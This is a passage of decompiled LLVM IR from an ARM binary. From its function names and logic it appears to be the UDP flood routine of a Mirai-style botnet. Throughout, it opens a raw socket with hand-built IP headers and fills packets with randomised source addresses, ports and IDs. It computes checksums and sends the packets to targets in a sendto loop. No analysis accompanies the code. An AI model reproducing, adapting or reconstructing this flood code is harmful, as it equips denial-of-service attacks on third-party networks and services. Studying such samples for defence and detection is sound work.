  %v6_8fa0 = call i32 @attack_get_opt_int(i32 %v0_8f98, i32* %v5_8fa0, i32 6, i32 65535)
  %v0_8fa8 = load i32, i32* @r5, align 4
  store i32 %v0_8fa8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8fa0, i32* %sb.global-to-local, align 4
  %v0_8fb8 = load i32, i32* @r4, align 4
  store i32 %v0_8fb8, i32* %r0.global-to-local, align 4
  %v4_8fbc = inttoptr i32 %v0_8fa8 to i32*
  %v5_8fbc = call i32 @attack_get_opt_int(i32 %v0_8fb8, i32* %v4_8fbc, i32 7, i32 65535)
  %v0_8fc0 = load i32, i32* @r5, align 4
  store i32 %v0_8fc0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_8fbc, i32* @sl, align 4
  %v0_8fd0 = load i32, i32* @r4, align 4
  store i32 %v0_8fd0, i32* %r0.global-to-local, align 4
  %v4_8fd4 = inttoptr i32 %v0_8fc0 to i32*
  %v5_8fd4 = call i32 @attack_get_opt_int(i32 %v0_8fd0, i32* %v4_8fd4, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8fe0 = load i32, i32* @r5, align 4
  store i32 %v0_8fe0, i32* %r1.global-to-local, align 4
  store i32 %v5_8fd4, i32* @r6, align 4
  %v0_8fe8 = load i32, i32* @r4, align 4
  store i32 %v0_8fe8, i32* %r0.global-to-local, align 4
  %v4_8fec = inttoptr i32 %v0_8fe0 to i32*
  %v5_8fec = call i32 @attack_get_opt_int(i32 %v0_8fe8, i32* %v4_8fec, i32 1, i32 1)
  %v2_8ff8 = load i32, i32* @global_var_243d0.55, align 4
  store i32 %v2_8ff8, i32* %r3.global-to-local, align 4
  %v1_8ffc = urem i32 %v5_8fec, 256
  store i32 %v1_8ffc, i32* %ip.global-to-local, align 4
  %v0_9000 = load i32, i32* @r5, align 4
  store i32 %v0_9000, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9008 = load i32, i32* @r4, align 4
  store i32 %v0_9008, i32* %r0.global-to-local, align 4
  %v5_9010 = inttoptr i32 %v0_9000 to i32*
  %v6_9010 = call i32 @attack_get_opt_int(i32 %v0_9008, i32* %v5_9010, i32 25, i32 %v2_8ff8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9024 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_9024, i32* %r0.global-to-local, align 4
  %v7_9028 = icmp eq i32 %v3_9024, -1
  store i1 %v7_9028, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9024, i32* @fp, align 4
  br i1 %v7_9028, label %dec_label_pc_93c8, label %dec_label_pc_9034

dec_label_pc_9034:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_903c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_903c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9050 = call i32 @__GI_setsockopt(i32 %v3_9024, i32 0, i32 3, i32 %v6_903c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9050, i32* %r0.global-to-local, align 4
  %v7_9054 = icmp eq i32 %v5_9050, -1
  store i1 %v7_9054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9054, label %dec_label_pc_93c0, label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9034
  %v0_905c = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_9068 = urem i32 %v0_905c, 65536
  store i32 %v3_9068, i32* %r2.global-to-local, align 4
  %v3_906c = icmp ugt i32 %v3_9068, 1459
  %v9_906c = icmp eq i32 %v3_9068, 1460
  store i1 %v9_906c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_906c, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_905c
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_905c, %bb
  %v0_90c8 = phi i32 [ %v3_9068, %dec_label_pc_905c ], [ 1460, %bb ]
  store i32 %v7_8f44, i32* %r0.global-to-local, align 4
  %v0_9078 = load i32, i32* %sb.global-to-local, align 4
  %v3_9080 = urem i32 %v0_9078, 65536
  store i32 %v3_9080, i32* %ip.global-to-local, align 4
  %v0_9084 = load i32, i32* @r7, align 4
  %v2_9084 = icmp eq i32 %v0_9084, 0
  store i1 %v2_9084, i1* %cpsr_z.global-to-local, align 1
  %v0_9088 = load i32, i32* @sl, align 4
  %v3_9088 = mul i32 %v0_9088, 65536
  br i1 %v2_9084, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_90c8, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_90b8 = phi i32 [ %v3_9080, %bb48 ], [ %v0_90c8, %bb49 ]
  %v3_9098 = urem i32 %v0_9088, 65536
  store i32 %v3_9098, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_90a0 = urem i32 %v7_8f44, 65536
  store i32 %v3_90a0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9084, label %.thread, label %dec_label_pc_90c0

.thread:                                          ; preds = %bb50
  %v2_90b4 = add nsw i32 %v1_90b8, 28
  store i32 %v2_90b4, i32* @sb, align 4
  %v2_90b8 = add nsw i32 %v1_90b8, 8
  store i32 %v2_90b8, i32* @sl, align 4
  br label %dec_label_pc_91e4.preheader

dec_label_pc_90c0:                                ; preds = %bb50
  %v1_90c8 = add nuw nsw i32 %v0_90c8, 28
  store i32 %v1_90c8, i32* @sb, align 4
  %v1_90cc = add nuw nsw i32 %v0_90c8, 8
  store i32 %v1_90cc, i32* @sl, align 4
  %tmp51 = mul i32 %v0_9078, 256
  %v3_90e0 = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_9078, 256
  %v4_90f0 = urem i32 %tmp52, 256
  %v5_90f0 = or i32 %v4_90f0, %v3_90e0
  store i32 %v5_90f0, i32* @r6, align 4
  store i32 %v3_9088, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_90c8, 256
  %v3_90fc = and i32 %tmp53, 65280
  store i32 %v3_90fc, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_9088, 256
  %v3_9100 = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_90cc, 256
  %v3_9104 = and i32 %tmp55, 65280
  store i32 %v3_9104, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_90c8, 256
  %v4_9108 = urem i32 %tmp56, 256
  %v5_9108 = or i32 %v4_9108, %v3_90fc
  store i32 %v5_9108, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_9088, 256
  %v4_910c = urem i32 %tmp57, 256
  %v5_910c = or i32 %v4_910c, %v3_9100
  store i32 %v5_910c, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_90cc to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_8f44, 256
  %v3_9114 = and i32 %tmp58, 65280
  store i32 %v3_9114, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_8f44, 256
  %v4_9124 = urem i32 %tmp59, 256
  %v5_9124 = or i32 %v4_9124, %v3_9114
  store i32 %v5_9124, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %v4_917c = sext i8 %v5_8f40 to i32
  %sext6 = mul nuw i32 %v5_9108, 65536
  %v4_9198 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_910c, 65536
  %v7_91cc = sdiv i32 %sext7, 65536
  %v1_918c = trunc i32 %v6_8f5c to i8
  %v3_91cc = sext i16 %rev to i32
  br label %dec_label_pc_912c

dec_label_pc_912c:                                ; preds = %.thread9, %dec_label_pc_90c0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_9138 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_9138, i32* %r0.global-to-local, align 4
  store i32 %v2_8f08, i32* %r3.global-to-local, align 4
  %v3_9140 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9140, i32* %r1.global-to-local, align 4
  %v2_9144 = load i32, i32* @r4, align 4
  %v5_9144 = mul i32 %v2_9144, 4
  %v6_9144 = add i32 %v5_9144, %v2_8f08
  %v7_9144 = inttoptr i32 %v6_9144 to i32*
  store i32 %v2_9138, i32* %v7_9144, align 4
  %v0_9148 = load i32, i32* %r3.global-to-local, align 4
  %v1_9148 = load i32, i32* %r1.global-to-local, align 4
  %v4_9148 = mul i32 %v1_9148, 4
  %v5_9148 = add i32 %v4_9148, %v0_9148
  %v6_9148 = inttoptr i32 %v5_9148 to i32*
  %v7_9148 = load i32, i32* %v6_9148, align 4
  store i32 %v7_9148, i32* %r0.global-to-local, align 4
  %v1_914c = inttoptr i32 %v7_9148 to i8*
  %v2_914c = load i8, i8* %v1_914c, align 1
  %tmp = urem i8 %v2_914c, 16
  %v1_9150 = zext i8 %tmp to i32
  %v1_9154 = or i32 %v1_9150, 64
  store i32 %v1_9154, i32* %r3.global-to-local, align 4
  %v1_9158 = trunc i32 %v1_9154 to i8
  store i8 %v1_9158, i8* %v1_914c, align 1
  %v0_915c = load i32, i32* %r0.global-to-local, align 4
  %v1_915c = inttoptr i32 %v0_915c to i8*
  %v2_915c = load i8, i8* %v1_915c, align 1
  %v1_9160 = and i8 %v2_915c, -16
  %v1_9164 = or i8 %v1_9160, 5
  store i32 %v1_8f88, i32* %ip.global-to-local, align 4
  %v0_916c = load i32, i32* %r1.global-to-local, align 4
  %v3_916c = mul i32 %v0_916c, 32
  store i32 %v3_916c, i32* %r2.global-to-local, align 4
  store i8 %v1_9164, i8* %v1_915c, align 1
  %v0_9174 = load i32, i32* %r1.global-to-local, align 4
  %v1_9174 = add i32 %v0_9174, 1
  store i32 %v1_9174, i32* @r4, align 4
  %v0_9178 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_9174, -8
  %v5_9178 = add i32 %v0_9178, %tmp61
  store i32 %v5_9178, i32* %r2.global-to-local, align 4
  store i32 %v4_917c, i32* %r1.global-to-local, align 4
  %v2_9180 = load i32, i32* %r0.global-to-local, align 4
  %v3_9180 = add i32 %v2_9180, 1
  %v4_9180 = inttoptr i32 %v3_9180 to i8*
  store i8 %v5_8f40, i8* %v4_9180, align 1
  store i32 %v1_8f64, i32* %r3.global-to-local, align 4
  %v0_9188 = load i32, i32* %ip.global-to-local, align 4
  %v2_9188 = icmp eq i32 %v0_9188, 0
  store i1 %v2_9188, i1* %cpsr_z.global-to-local, align 1
  %v2_918c = load i32, i32* %r0.global-to-local, align 4
  %v3_918c = add i32 %v2_918c, 8
  %v4_918c = inttoptr i32 %v3_918c to i8*
  store i8 %v1_918c, i8* %v4_918c, align 1
  %v0_9190 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9190, label %.thread9, label %bb60

bb60:                                             ; preds = %dec_label_pc_912c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_9194 = load i32, i32* %r0.global-to-local, align 4
  %v4_9194 = add i32 %v3_9194, 6
  %v5_9194 = inttoptr i32 %v4_9194 to i16*
  store i16 64, i16* %v5_9194, align 2
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_912c, %bb60
  store i32 %v4_9198, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_91a0 = load i32, i32* %r0.global-to-local, align 4
  %v3_91a0 = add i32 %v2_91a0, 9
  %v4_91a0 = inttoptr i32 %v3_91a0 to i8*
  store i8 17, i8* %v4_91a0, align 1
  %v0_91a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_91a4 = trunc i32 %v0_91a4 to i16
  %v2_91a4 = load i32, i32* %r0.global-to-local, align 4
  %v3_91a4 = add i32 %v2_91a4, 2
  %v4_91a4 = inttoptr i32 %v3_91a4 to i16*
  store i16 %v1_91a4, i16* %v4_91a4, align 2
  store i32 %v6_9010, i32* %ip.global-to-local, align 4
  %v1_91ac = load i32, i32* %r0.global-to-local, align 4
  %v2_91ac = add i32 %v1_91ac, 12
  %v3_91ac = inttoptr i32 %v2_91ac to i32*
  store i32 %v6_9010, i32* %v3_91ac, align 4
  %v0_91b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_91b0 = load i32, i32* @r8, align 4
  %v2_91b0 = add i32 %v1_91b0, %v0_91b0
  store i32 %v2_91b0, i32* %r2.global-to-local, align 4
  %v1_91b4 = add i32 %v2_91b0, 16
  %v2_91b4 = inttoptr i32 %v1_91b4 to i32*
  %v3_91b4 = load i32, i32* %v2_91b4, align 4
  store i32 %v3_91b4, i32* %r3.global-to-local, align 4
  %v0_91b8 = load i32, i32* @r5, align 4
  %v1_91b8 = trunc i32 %v0_91b8 to i16
  %v2_91b8 = load i32, i32* %r0.global-to-local, align 4
  %v3_91b8 = add i32 %v2_91b8, 4
  %v4_91b8 = inttoptr i32 %v3_91b8 to i16*
  store i16 %v1_91b8, i16* %v4_91b8, align 2
  %v0_91bc = load i32, i32* %r0.global-to-local, align 4
  %v1_91bc = add i32 %v0_91bc, 20
  store i32 %v1_91bc, i32* %r1.global-to-local, align 4
  %v0_91c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_91c0 = add i32 %v0_91bc, 16
  %v3_91c0 = inttoptr i32 %v2_91c0 to i32*
  store i32 %v0_91c0, i32* %v3_91c0, align 4
  %v0_91c4 = load i32, i32* @r6, align 4
  %v1_91c4 = trunc i32 %v0_91c4 to i16
  %v2_91c4 = load i32, i32* %r0.global-to-local, align 4
  %v3_91c4 = add i32 %v2_91c4, 20
  %v4_91c4 = inttoptr i32 %v3_91c4 to i16*
  store i16 %v1_91c4, i16* %v4_91c4, align 2
  store i32 %v3_91cc, i32* %r0.global-to-local, align 4
  store i32 %v7_91cc, i32* %r3.global-to-local, align 4
  %v0_91d0 = load i32, i32* @r4, align 4
  %v1_91d0 = load i32, i32* @r7, align 4
  %v9_91d0 = icmp eq i32 %v0_91d0, %v1_91d0
  store i1 %v9_91d0, i1* %cpsr_z.global-to-local, align 1
  %v2_91d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_91d4 = add i32 %v2_91d4, 4
  %v4_91d4 = inttoptr i32 %v3_91d4 to i16*
  store i16 %rev, i16* %v4_91d4, align 2
  %v0_91d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_91d8 = trunc i32 %v0_91d8 to i16
  %v2_91d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_91d8 = add i32 %v2_91d8, 2
  %v4_91d8 = inttoptr i32 %v3_91d8 to i16*
  store i16 %v1_91d8, i16* %v4_91d8, align 2
  %v0_91dc = load i32, i32* @r4, align 4
  store i32 %v0_91dc, i32* %stack_var_-44, align 4
  %v5_91e0 = icmp slt i32 %v0_91d0, %v1_91d0
  br i1 %v5_91e0, label %dec_label_pc_912c, label %dec_label_pc_91e4.preheader.loopexit

dec_label_pc_91e4.preheader.loopexit:             ; preds = %.thread9
  %v0_91e8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_91e4.preheader

dec_label_pc_91e4.preheader:                      ; preds = %.thread, %dec_label_pc_91e4.preheader.loopexit
  %v0_91e8.pre = phi i32 [ %v0_91e8.pre.pre, %dec_label_pc_91e4.preheader.loopexit ], [ 0, %.thread ]
  %v3_9350 = icmp eq i32 %v6_9010, -1
  %v8_9350 = icmp eq i32 %v6_9010, -1
  %v3_9368 = icmp eq i32 %v3_90a0, 65535
  %v2_93a4 = icmp eq i32 %v1_8ffc, 0
  br label %dec_label_pc_91e4

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_92e4, %dec_label_pc_91e4.preheader
  %v0_91e8 = phi i32 [ %v0_91e8.pre, %dec_label_pc_91e4.preheader ], [ 0, %dec_label_pc_92e4 ], [ 0, %dec_label_pc_91e4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_91e8 = icmp eq i32 %v0_91e8, 0
  store i1 %v2_91e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_91e8, label %dec_label_pc_91e4, label %dec_label_pc_91f4

dec_label_pc_91f4:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_92e4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_9260, %dec_label_pc_91f4
  %v1_920c = phi i32 [ %v1_92d4, %dec_label_pc_9260 ], [ 0, %dec_label_pc_91f4 ]
  %v5_91fc = mul i32 %v1_920c, 24
  %v1_9200 = load i32, i32* @r8, align 4
  %v2_9200 = add i32 %v1_9200, %v5_91fc
  store i32 %v2_9200, i32* %r3.global-to-local, align 4
  store i32 %v2_8f08, i32* %r1.global-to-local, align 4
  %v1_9208 = add i32 %v2_9200, 20
  %v2_9208 = inttoptr i32 %v1_9208 to i8*
  %v3_9208 = load i8, i8* %v2_9208, align 1
  %v4_9208 = zext i8 %v3_9208 to i32
  store i32 %v4_9208, i32* %r2.global-to-local, align 4
  %v4_920c = mul i32 %v1_920c, 4
  %v5_920c = add i32 %v4_920c, %v2_8f08
  %v6_920c = inttoptr i32 %v5_920c to i32*
  %v7_920c = load i32, i32* %v6_920c, align 4
  store i32 %v7_920c, i32* @r5, align 4
  %v7_9210 = icmp eq i8 %v3_9208, 31
  store i1 %v7_9210, i1* %cpsr_z.global-to-local, align 1
  %v1_9214 = add i32 %v7_920c, 20
  store i32 %v1_9214, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_9208, 32
  br i1 %tmp62, label %dec_label_pc_92f8, label %dec_label_pc_921c

dec_label_pc_921c:                                ; preds = %dec_label_pc_91f8
  store i32 %v6_9010, i32* %r3.global-to-local, align 4
  store i1 %v8_9350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9350, label %dec_label_pc_9358, label %dec_label_pc_9228

dec_label_pc_9228:                                ; preds = %dec_label_pc_92f8, %dec_label_pc_921c
  store i32 %v3_90a0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9368, label %dec_label_pc_9374, label %dec_label_pc_923c

dec_label_pc_923c:                                ; preds = %dec_label_pc_9358.dec_label_pc_923c_crit_edge, %dec_label_pc_9228
  %v1_9240 = phi i32 [ %v1_9240.pre, %dec_label_pc_9358.dec_label_pc_923c_crit_edge ], [ 65535, %dec_label_pc_9228 ]
  store i32 %v3_9080, i32* %r0.global-to-local, align 4
  %v9_9240 = icmp eq i32 %v3_9080, %v1_9240
  store i1 %v9_9240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9240, label %dec_label_pc_9388, label %dec_label_pc_9248

dec_label_pc_9248:                                ; preds = %dec_label_pc_9374, %dec_label_pc_923c
  %v1_924c = phi i32 [ %v1_9380, %dec_label_pc_9374 ], [ %v1_9240, %dec_label_pc_923c ]
  store i32 %v3_9098, i32* %r1.global-to-local, align 4
  %v9_924c = icmp eq i32 %v3_9098, %v1_924c
  store i1 %v9_924c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_924c, label %dec_label_pc_939c, label %dec_label_pc_9254

dec_label_pc_9254:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9248
  store i32 %v1_8ffc, i32* %r3.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_93a4, label %dec_label_pc_9260, label %dec_label_pc_93b0

dec_label_pc_9260:                                ; preds = %dec_label_pc_9254, %dec_label_pc_939c, %dec_label_pc_93b0
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9264 = load i32, i32* @r5, align 4
  %v3_9264 = add i32 %v2_9264, 10
  %v4_9264 = inttoptr i32 %v3_9264 to i16*
  store i16 0, i16* %v4_9264, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_926c = load i32, i32* @r5, align 4
  store i32 %v0_926c, i32* @r0, align 4
  %v2_9270 = call i32 @checksum_generic(i32 %v0_926c, i32 20)
  %v3_9270 = trunc i32 %v2_9270 to i16
  %v3_9274 = load i32, i32* @r5, align 4
  %v4_9274 = add i32 %v3_9274, 10
  %v5_9274 = inttoptr i32 %v4_9274 to i16*
  store i16 %v3_9270, i16* %v5_9274, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_927c = load i32, i32* @r6, align 4
  %v3_927c = add i32 %v2_927c, 6
  %v4_927c = inttoptr i32 %v3_927c to i16*
  store i16 0, i16* %v4_927c, align 2
  %v0_9280 = load i32, i32* @r6, align 4
  store i32 %v0_9280, i32* @r1, align 4
  %v1_9284 = add i32 %v0_9280, 4
  %v2_9284 = inttoptr i32 %v1_9284 to i16*
  %v3_9284 = load i16, i16* %v2_9284, align 2
  %v4_9284 = zext i16 %v3_9284 to i32
  store i32 %v4_9284, i32* %r2.global-to-local, align 4
  %v0_9288 = load i32, i32* @sl, align 4
  store i32 %v0_9288, i32* %r3.global-to-local, align 4
  %v0_928c = load i32, i32* @r5, align 4
  store i32 %v0_928c, i32* %r0.global-to-local, align 4
  %v4_9290 = call i32 @checksum_tcpudp(i32 %v0_928c, i32 %v0_9280, i32 %v4_9284, i32 %v0_9288)
  %v5_9290 = trunc i32 %v4_9290 to i16
  store i32 %v4_9290, i32* %r0.global-to-local, align 4
  %v3_9294 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9294, i32* %r3.global-to-local, align 4
  %v3_9298 = mul i32 %v3_9294, 32
  store i32 %v3_9298, i32* %lr.global-to-local, align 4
  %v3_929c = load i32, i32* @r6, align 4
  %v4_929c = add i32 %v3_929c, 6
  %v5_929c = inttoptr i32 %v4_929c to i16*
  store i16 %v5_9290, i16* %v5_929c, align 2
  %v0_92a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_92a0 = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_92a0, -8
  %v5_92a0 = add i32 %v0_92a0, %tmp63
  store i32 %v5_92a0, i32* %lr.global-to-local, align 4
  %v0_92a4 = load i32, i32* @r6, align 4
  %v1_92a4 = add i32 %v0_92a4, 2
  %v2_92a4 = inttoptr i32 %v1_92a4 to i16*
  %v3_92a4 = load i16, i16* %v2_92a4, align 2
  %v4_92a4 = zext i16 %v3_92a4 to i32
  store i32 %v4_92a4, i32* @r6, align 4
  %v1_92a8 = load i32, i32* @r8, align 4
  %v2_92a8 = add i32 %v1_92a8, %v5_92a0
  store i32 %v2_92a8, i32* @lr, align 4
  %v3_92ac = add i32 %v2_92a8, 2
  %v4_92ac = inttoptr i32 %v3_92ac to i16*
  store i16 %v3_92a4, i16* %v4_92ac, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_92b8 = load i32, i32* @r5, align 4
  store i32 %v0_92b8, i32* %r1.global-to-local, align 4
  %v0_92bc = load i32, i32* @fp, align 4
  store i32 %v0_92bc, i32* %r0.global-to-local, align 4
  %v0_92c0 = load i32, i32* @sb, align 4
  store i32 %v0_92c0, i32* %r2.global-to-local, align 4
  %v0_92c4 = load i32, i32* @lr, align 4
  %v6_92cc = call i32 @__libc_sendto(i32 %v0_92bc, i32 %v0_92b8, i32 %v0_92c0, i32 16384, i32 %v0_92c4, i32 16)
  %v3_92d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_92d0, i32* %r3.global-to-local, align 4
  %v1_92d4 = add i32 %v3_92d0, 1
  store i32 %v1_92d4, i32* %r0.global-to-local, align 4
  %v1_92d8 = load i32, i32* @r7, align 4
  %v9_92d8 = icmp eq i32 %v1_92d4, %v1_92d8
  store i1 %v9_92d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_92d4, i32* %stack_var_-44, align 4
  %v5_92e0 = icmp slt i32 %v1_92d4, %v1_92d8
  br i1 %v5_92e0, label %dec_label_pc_91f8, label %dec_label_pc_92e4

dec_label_pc_92e4:                                ; preds = %dec_label_pc_9260
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92e8 = icmp eq i32 %v1_92d8, 0
  store i1 %v2_92e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_92e8, label %dec_label_pc_91e4, label %dec_label_pc_91f4

dec_label_pc_92f8:                                ; preds = %dec_label_pc_91f8
  %v1_92f8 = add i32 %v2_9200, 16
  %v2_92f8 = inttoptr i32 %v1_92f8 to i32*
  %v3_92f8 = load i32, i32* %v2_92f8, align 4
  %v0_92fc = call i32 @rand_next()
  store i32 %v0_92fc, i32* %r0.global-to-local, align 4
  %v3_9300 = load i32, i32* %stack_var_-44, align 4
  %v5_9308 = mul i32 %v3_9300, 24
  %v1_930c = and i32 %v3_92f8, 16711680
  store i32 %v1_930c, i32* %ip.global-to-local, align 4
  %v3_9310 = udiv i32 %v3_92f8, 16777216
  %v4_9314 = udiv i32 %v1_930c, 256
  %v5_9314 = or i32 %v4_9314, %v3_9310
  store i32 %v5_9314, i32* %r2.global-to-local, align 4
  %v1_9318 = load i32, i32* @r8, align 4
  %v2_9318 = add i32 %v1_9318, %v5_9308
  store i32 %v2_9318, i32* %r1.global-to-local, align 4
  %v1_931c = and i32 %v3_92f8, 65280
  store i32 %v1_931c, i32* %r3.global-to-local, align 4
  %v1_9320 = add i32 %v2_9318, 20
  %v2_9320 = inttoptr i32 %v1_9320 to i8*
  %v3_9320 = load i8, i8* %v2_9320, align 1
  %v4_9320 = zext i8 %v3_9320 to i32
  store i32 %v4_9320, i32* %ip.global-to-local, align 4
  %v5_9328 = call i32 @llvm.bswap.i32(i32 %v3_92f8)
  %v7_932c = lshr i32 %v0_92fc, %v4_9320
  %v8_932c = add i32 %v7_932c, %v5_9328
  store i32 %v8_932c, i32* %r2.global-to-local, align 4
  %v1_9330 = and i32 %v8_932c, 16711680
  store i32 %v1_9330, i32* %r0.global-to-local, align 4
  %v1_933c = and i32 %v8_932c, 65280
  store i32 %v1_933c, i32* %r1.global-to-local, align 4
  %v5_9344 = call i32 @llvm.bswap.i32(i32 %v8_932c)
  %v1_9348 = load i32, i32* @r5, align 4
  %v2_9348 = add i32 %v1_9348, 16
  %v3_9348 = inttoptr i32 %v2_9348 to i32*
  store i32 %v5_9344, i32* %v3_9348, align 4
  store i32 %v6_9010, i32* %r3.global-to-local, align 4
  store i1 %v8_9350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9350, label %dec_label_pc_9358, label %dec_label_pc_9228

dec_label_pc_9358:                                ; preds = %dec_label_pc_92f8, %dec_label_pc_921c
  %v0_9358 = call i32 @rand_next()
  store i32 %v0_9358, i32* %r0.global-to-local, align 4
  store i32 %v3_90a0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9368, i1* %cpsr_z.global-to-local, align 1
  %v1_936c = load i32, i32* @r5, align 4
  %v2_936c = add i32 %v1_936c, 12
  %v3_936c = inttoptr i32 %v2_936c to i32*
  store i32 %v0_9358, i32* %v3_936c, align 4
  br i1 %v3_9368, label %dec_label_pc_9374, label %dec_label_pc_9358.dec_label_pc_923c_crit_edge

dec_label_pc_9358.dec_label_pc_923c_crit_edge:    ; preds = %dec_label_pc_9358
  %v1_9240.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_923c

dec_label_pc_9374:                                ; preds = %dec_label_pc_9358, %dec_label_pc_9228
  %v0_9374 = call i32 @rand_next()
  %v1_9374 = trunc i32 %v0_9374 to i16
  %v3_9378 = load i32, i32* @r5, align 4
  %v4_9378 = add i32 %v3_9378, 4
  %v5_9378 = inttoptr i32 %v4_9378 to i16*
  store i16 %v1_9374, i16* %v5_9378, align 2
  store i32 %v3_9080, i32* %r0.global-to-local, align 4
  %v1_9380 = load i32, i32* @r4, align 4
  %v9_9380 = icmp eq i32 %v3_9080, %v1_9380
  store i1 %v9_9380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9380, label %dec_label_pc_9388, label %dec_label_pc_9248

dec_label_pc_9388:                                ; preds = %dec_label_pc_9374, %dec_label_pc_923c
  %v0_9388 = call i32 @rand_next()
  %v1_9388 = trunc i32 %v0_9388 to i16
  store i32 %v0_9388, i32* %r0.global-to-local, align 4
  store i32 %v3_9098, i32* %r1.global-to-local, align 4
  %v1_9390 = load i32, i32* @r4, align 4
  %v9_9390 = icmp eq i32 %v3_9098, %v1_9390
  store i1 %v9_9390, i1* %cpsr_z.global-to-local, align 1
  %v3_9394 = load i32, i32* @r5, align 4
  %v4_9394 = add i32 %v3_9394, 20
  %v5_9394 = inttoptr i32 %v4_9394 to i16*
  store i16 %v1_9388, i16* %v5_9394, align 2
  br i1 %v9_9390, label %dec_label_pc_939c, label %dec_label_pc_9254

dec_label_pc_939c:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9248
  %v0_939c = call i32 @rand_next()
  %v1_939c = trunc i32 %v0_939c to i16
  store i32 %v0_939c, i32* %r0.global-to-local, align 4
  store i32 %v1_8ffc, i32* %r3.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  %v3_93a8 = load i32, i32* @r6, align 4
